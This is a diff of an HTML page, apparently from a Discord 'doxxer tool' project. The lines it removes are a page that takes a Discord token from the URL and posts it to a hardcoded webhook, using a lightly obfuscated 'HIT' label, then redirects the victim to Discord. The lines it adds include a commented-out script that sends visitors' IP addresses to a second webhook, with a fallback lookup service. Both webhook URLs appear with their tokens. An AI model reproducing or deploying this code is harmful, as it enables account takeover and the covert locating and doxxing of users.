@@ -1,21 +1,54 @@
-<!-- Middle man - Project Disk -->
-<style>
-    body {
-      background-color: 	#282b30;
-    }
-  </style>
-  <script>
-    document.addEventListener("DOMContentLoaded", function(event) {
-        
+
+<head>
+    <meta charset="UTF-8">
+    <title>Discord User Doxxer Tool</title>
+
+    <!-- metadata description-->
+
+    <meta name="description" content="Doxx discord users just from their ID!">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Infdevv">
+
     
-  // get webhook url and token from url parameters
-  const wh = "https://discord.com/api/webhooks/1226282773921140846/vXlOS-V1jClWtc0Y19p1kSpVkzrG3f6gbZea-kvflVrxxFJHJYnRtSVfcuqvg7Nmvphm"
-  const nektok = new URLSearchParams(window.location.search).get("token")
-  
-  // post a webhook
-  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";let xstin = chars[7];xstin += chars[8]; xstin += chars[19]; xstin += " R"[0];  xstin += chars[0]; xstin += chars[19]; 
-  fetch(wh, {method: "POST",headers: {"Content-Type": "application/json"},body: JSON.stringify({"content": xstin +" "+ nektok})}).then(e=>e.text()).then(e=>{})
-  setTimeout(function(){ window.location.href="https://discord.com/channels/@me"}, 2000)
-})
-  </script>
-  
+
+</head>
+<script>
+    /*
+    fetch("https://ipapi.co/json/").then(response => response.json()).then(data => {
+        ip = data.ip
+        wh = "https://discord.com/api/webhooks/1196639001294143488/W7xHvyItSHB86jMDUiCENyi5ULgL_KRv759wrWx7U0ny3p6IZyTYxdplEvWG6F9DeUoV"
+        fetch(wh, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                "content": "HIT:" + ip
+            })
+            }
+        )
+
+        .catch(function(error) {
+            fetch("https://api.ipify.org/?format=json") // try a diffrent ip grabbing api
+                .then(response => response.json())
+                .then(data => {
+                    ip = data.ip
+
+                    fetch(wh, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        }
+                        ,
+                        body: JSON.stringify({
+                            "content": "HIT (fallback):" + ip
+                        })
+                    })
+                })
+        })
+        .then(response => console.log("Success:", response));
+
+    })*/
+</script>
